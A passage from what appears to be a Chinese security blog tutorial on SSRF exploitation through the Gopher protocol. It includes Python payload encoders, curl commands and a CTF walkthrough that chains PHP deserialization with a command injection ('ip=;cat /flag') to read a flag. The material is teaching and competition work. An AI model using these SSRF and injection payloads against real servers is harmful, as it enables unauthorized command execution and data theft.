class="code-snippet_outer"><span class="code-snippet__attribute">curl</span> gopher://47.xxx.xxx.72:80/_GET<span class="code-snippet__number">%20</span>/echo.php<span class="code-snippet__number">%3</span>Fwhoami<span class="code-snippet__number">%3</span>DBunny<span class="code-snippet__number">%20</span>HTTP/1.1<span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>AHost<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%2047</span>.xxx.xxx.72<span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>A</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.28586171310629516" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/29_AqqGFkibGhwvtFf2QX0YSlwbHz7h1w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gEoG16L24gzU1PaLRiaaX19Q9e2AqqGFkibGhwvtFf2QX0YSlwbHz7h1w/640?wx_fmt=png'" data-type="png" data-w="969" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">如上图，成功用GET方法传参并输出“Hello Bunny”。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><strong style="color: rgb(0, 0, 0);">（3）利用Gopher协议发送HTTP POST请求</strong></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">测试代码：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__comment">// echo.php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">echo</span> <span class="code-snippet__string">"Hello "</span>.$_POST[<span class="code-snippet__string">"whoami"</span>].<span class="code-snippet__string">"\n"</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">接下来我们构造payload。一个典型的POST型的HTTP包类似如下：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="http"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">POST</span> <span class="code-snippet__string">/echo.php</span> HTTP/1.1</span></code><code><span class="code-snippet_outer"><span class="code-snippet__attribute">Host</span>: 47.xxx.xxx.72</span></code><code><span class="code-snippet_outer"><span class="code-snippet__attribute">Content-Type</span>: application/x-www-form-urlencoded</span></code><code><span class="code-snippet_outer"><span class="code-snippet__attribute">Content-Length</span>: 12</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">whoami</span>=Bunny</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><strong style="color: rgb(0, 0, 0);">注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“whoami=Bunny”的长度。</strong></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="python"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">import</span> urllib.parse</span></code><code><span class="code-snippet_outer">payload =\</span></code><code><span class="code-snippet_outer"><span class="code-snippet__string">"""POST /echo.php HTTP/1.1</span></span></code><code><span class="code-snippet_outer">Host: 47.xxx.xxx.72</span></code><code><span class="code-snippet_outer">Content-Type: application/x-www-form-urlencoded</span></code><code><span class="code-snippet_outer">Content-Length: 12</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">whoami=Bunny</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">"""</span>  </span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span></span></code><code><span class="code-snippet_outer">tmp = urllib.parse.quote(payload)</span></code><code><span class="code-snippet_outer">new = tmp.replace(<span class="code-snippet__string">'%0A'</span>,<span class="code-snippet__string">'%0D%0A'</span>)</span></code><code><span class="code-snippet_outer">result = <span class="code-snippet__string">'gopher://47.xxx.xxx.72:80/'</span>+<span class="code-snippet__string">'_'</span>+new</span></code><code><span class="code-snippet_outer">print(result)</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.08987603305785125" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/30_ibo2fSfDbeW70FrlLImYzLtkk1wxEg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gG1gwcbYiaIyp4ylKJ19Q0Hr92jibo2fSfDbeW70FrlLImYzLtkk1wxEg/640?wx_fmt=png'" data-type="png" data-w="968" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">然后执行：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="apache"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">curl</span> gopher://47.xxx.xxx.72:80/_POST<span class="code-snippet__number">%20</span>/echo.php<span class="code-snippet__number">%20</span>HTTP/1.1<span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>AHost<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%2047</span>.xxx.xxx.72<span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>AContent-Type<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%20</span>application/x-www-form-urlencoded<span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>AContent-Length<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%2012</span><span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>A<span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>Awhoami<span class="code-snippet__number">%3</span>DBunny<span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>A</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.29338842975206614" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/31_msiaN2ia1tP7ocAGawB49T4HYuicNw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gHMiczeXXFs0FiasjyeT0ZwsJibxCzumsiaN2ia1tP7ocAGawB49T4HYuicNw/640?wx_fmt=png'" data-type="png" data-w="968" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">如上图，成功用POST方法传参并输出“Hello Bunny”。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><strong style="color: rgb(0, 0, 0);">[2020 科来杯初赛]Web1</strong> 这道题就是典型的运用Gopher发送HTTP POST请求进行SSRF攻击的思路。</p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">[2020 科来杯初赛]Web1</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">进入题目后即给处源码：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.5837887067395264" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/32_uYo6tCfx4alVib0VOpNqQ0RRfia2Tw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g8PiaxQF1yZMiaUZ7qSCOLAkxudIfuYo6tCfx4alVib0VOpNqQ0RRfia2Tw/640?wx_fmt=png'" data-type="png" data-w="1098" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">这里很明显就是一个SSRF，url过滤了 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">file</span></code>、 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">ftp</span></code>，但是必须要包含 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">127.0</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">.</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">0.1</span></code>。并且，我们还发现一个tool.php页面，但是该页面进去之后仅显示一个“Not localhost”，我们可以用这个ssrf将tool.php的源码读住来，构造反序列化poc：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="xml"><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__class"><span class="code-snippet__keyword">class</span> <span class="code-snippet__title">Welcome</span> </span>{</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">protected</span> $url = <span class="code-snippet__string">"http://127.0.0.1/tool.php"</span>;</span></code><code><span class="code-snippet_outer">    </span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">$poc = <span class="code-snippet__keyword">new</span> Welcome;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">//echo serialize($poc);</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">echo</span> urlencode(serialize($poc));</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">生成：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer">O%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A25%3A%22http%3A%2F%2F127.<span class="code-snippet__number">0</span>.<span class="code-snippet__number">0</span>.<span class="code-snippet__number">1</span>%2Ftool.php%22%3B%7D</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">// O:<span class="code-snippet__number">7</span>:<span class="code-snippet__string">"Welcome"</span>:<span class="code-snippet__number">1</span>:{<span class="code-snippet__keyword">s</span>:<span class="code-snippet__number">6</span>:<span class="code-snippet__string">"*url"</span>;<span class="code-snippet__keyword">s</span>:<span class="code-snippet__number">25</span>:<span class="code-snippet__string">"http://127.0.0.1/tool.php"</span>;}</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">将Welcome后面表示对象属性个数的“1”改为“2”即可绕过 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">__destruct</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">()</span></code>的限制。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.49973944762897343" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/33_tTIYrol8WDYMTElEZW5hZmhuucZ8lA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gtlt9AALboNjWFwa1Ztibg6DD3tTIYrol8WDYMTElEZW5hZmhuucZ8lA/640?wx_fmt=png'" data-type="png" data-w="1919" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">读出来tool.php的源码为：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__comment">#tool.php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer">error_reporting(<span class="code-snippet__number">0</span>);</span></code><code><span class="code-snippet_outer">$respect_show_ping = <span class="code-snippet__function"><span class="code-snippet__keyword">function</span><span class="code-snippet__params">($params)</span> </span>{</span></code><code><span class="code-snippet_outer">   extract($params);</span></code><code><span class="code-snippet_outer">   $ip = <span class="code-snippet__keyword">isset</span>($ip) ? $ip :<span class="code-snippet__string">'127.0.0.1'</span>;</span></code><code><span class="code-snippet_outer">   system(<span class="code-snippet__string">'ping -c 1 '</span>.$ip);</span></code><code><span class="code-snippet_outer">};</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> ($_SERVER[<span class="code-snippet__string">"REMOTE_ADDR"</span>] !== <span class="code-snippet__string">"127.0.0.1"</span>){</span></code><code><span class="code-snippet_outer">   <span class="code-snippet__keyword">echo</span> <span class="code-snippet__string">'&lt;h2&gt;Not localhost!&lt;/h2&gt;'</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">   highlight_file(<span class="code-snippet__keyword">__FILE__</span>);</span></code><code><span class="code-snippet_outer">   $respect_show_ping($_POST);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">代码审计后可知tool.php页面存在命令执行漏洞。当REMOTEADDR为127.0.0.1时才可执行命令。REMOTEADDR头获取的是客户端的真实的IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的IP（建立tcp连接的那个），这个值是不可以伪造的，如果没有代理的话，这个值就是用户实际的IP值，有代理的话，用户的请求会经过代理再到服务器，这个时候REMOTE_ADDR会被设置为代理机器的IP值。而X-Forwarded-For的值是可以篡改的。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">既然这里要求当REMOTEADDR为127.0.0.1时才可执行命令，且REMOTEADDR的值是不可以伪造的，我们要想让REMOTE_ADDR的值为127.0.0.1，不可能通过修改X-Forwarded-For的值来实现，我们要利用SSRF。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">我们可以利用index.php页面的SSRF利用gopher协议发POST包请求tool.php，进行命令执行。这样，整个攻击过程是在服务端进行的REMOTE_ADDR的值也就是127.0.0.1了。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">SSRF，利用gopher发POST包，进行命令执行</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="python"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">import</span> urllib.parse</span></code><code><span class="code-snippet_outer">test =\</span></code><code><span class="code-snippet_outer"><span class="code-snippet__string">"""POST /tool.php HTTP/1.1</span></span></code><code><span class="code-snippet_outer">Host: 127.0.0.1</span></code><code><span class="code-snippet_outer">Content-Type: application/x-www-form-urlencoded</span></code><code><span class="code-snippet_outer">Content-Length: 13</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">ip=;cat /flag</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">"""</span>  </span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">#注意后面一定要有回车，回车结尾表示http请求结束</span></span></code><code><span class="code-snippet_outer">tmp = urllib.parse.quote(test)</span></code><code><span class="code-snippet_outer">new = tmp.replace(<span class="code-snippet__string">'%0A'</span>,<span class="code-snippet__string">'%0D%0A'</span>)</span></code><code><span class="code-snippet_outer">result = <span class="code-snippet__string">'gopher://127.0.0.1:80/'</span>+<span class="code-snippet__string">'_'</span>+new</span></code><code><span class="code-snippet_outer">print(result)</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">这里因为我们是把payload发送到服务端让服务端执行，所以我们的Host和gopher里的Host为127.0.0.1。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">生成gopher协议格式的payload为：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="apache"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">gopher</span>://127.0.0.1:80/_POST<span class="code-snippet__number">%20</span>/tool.php<span class="code-snippet__number">%20</span>HTTP/1.1<span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>AHost<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%20127</span>.0.0.1<span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>AContent-Type<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%20</span>application/x-www-form-urlencoded<span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>AContent-Length<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%2013</span><span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>A<span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>Aip<span class="code-snippet__number">%3</span>D<span class="code-snippet__number">%3</span>Bcat<span class="code-snippet__number">%20</span>/flag<span class="code-snippet__number">%0</span>D<span class="code-snippet__number">%0</span>A</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">然后构造反序列化exp：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer">&lt;?php</span></code><code><span class="code-snippet_outer">class Welcome {</span></code><code><span class="code-snippet_outer">    protected $url = <span class="code-snippet__string">"gopher://127.0.0.1:80/_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A"</span>;</span></code><code><span class="code-snippet_outer">    </span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">$poc = new Welcome;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__regexp">//echo</span> serialize($poc);</span></code><code><span class="code-snippet_outer">echo urlencode(serialize($poc));</span></code><code><span class="code-snippet_outer">?&gt;</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">生成payload：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="apache"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">O</span><span class="code-snippet__number">%3</span>A7<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%22</span>Welcome<span class="code-snippet__number">%22</span><span class="code-snippet__number">%3</span>A1<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%7</span>Bs<span class="code-snippet__number">%3</span>A6<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%22</span><span class="code-snippet__number">%00</span><span class="code-snippet__number">%2</span>A<span class="code-snippet__number">%00</span>url<span class="code-snippet__number">%22</span><span class="code-snippet__number">%3</span>Bs<span class="code-snippet__number">%3</span>A197<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%22</span>gopher<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%2</span>F<span class="code-snippet__number">%2</span>F127.0.0.1<span class="code-snippet__number">%3</span>A80<span class="code-snippet__number">%2</span>F_POST<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%2</span>Ftool.php<span class="code-snippet__number">%2520</span>HTTP<span class="code-snippet__number">%2</span>F1.1<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>AHost<span class="code-snippet__number">%253</span>A<span class="code-snippet__number">%2520127</span>.0.0.1<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>AContent-Type<span class="code-snippet__number">%253</span>A<span class="code-snippet__number">%2520</span>application<span class="code-snippet__number">%2</span>Fx-www-form-urlencoded<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>AContent-Length<span class="code-snippet__number">%253</span>A<span class="code-snippet__number">%252013</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aip<span class="code-snippet__number">%253</span>D<span class="code-snippet__number">%253</span>Bcat<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%2</span>Fflag<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%22</span><span class="code-snippet__number">%3</span>B<span class="code-snippet__number">%7</span>D</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">同样将Welcome后面表示对象属性个数的“1”改为“2”绕过 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">__destruct</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">()</span></code>的限制后执行：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.4973958333333333" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/34_4df9U0HTsFBlm2SMvqD87UmjUFBV4w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5ggAuJ60WgpQIrUjVcbkckEc2J4df9U0HTsFBlm2SMvqD87UmjUFBV4w/640?wx_fmt=png'" data-type="png" data-w="1920" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">如上图，命令执行成功。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><strong style="color: rgb(0, 0, 0);">注意：</strong>这里要注意的是，我们发送的是POST包，而如果发送的是GET包的话，当这个URL经过服务器时，payload部分会被自动url解码，%20等字符又会被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要对payload进行二次URL编码。编码结果类似如下：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="apache"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">gopher</span><span class="code-snippet__number">%3</span>a<span class="code-snippet__number">%2</span>f<span class="code-snippet__number">%2</span>f127.0.0.1<span class="code-snippet__number">%3</span>a80<span class="code-snippet__number">%2</span>f_POST<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%2</span>ftool.php<span class="code-snippet__number">%2520</span>HTTP<span class="code-snippet__number">%2</span>f1.1<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>AHost<span class="code-snippet__number">%253</span>A<span class="code-snippet__number">%2520127</span>.0.0.1<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>AContent-Type<span class="code-snippet__number">%253</span>A<span class="code-snippet__number">%2520</span>application<span class="code-snippet__number">%2</span>fx-www-form-urlencoded<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>AContent-Length<span class="code-snippet__number">%253</span>A<span class="code-snippet__number">%252013</span><span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>Aip<span class="code-snippet__number">%253</span>D<span class="code-snippet__number">%253</span>Bcat<span class="code-snippet__number">%2520</span><span class="code-snippet__number">%2</span>fflag<span class="code-snippet__number">%250</span>D<span class="code-snippet__number">%250</span>A</span></code></pre></section><h2 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 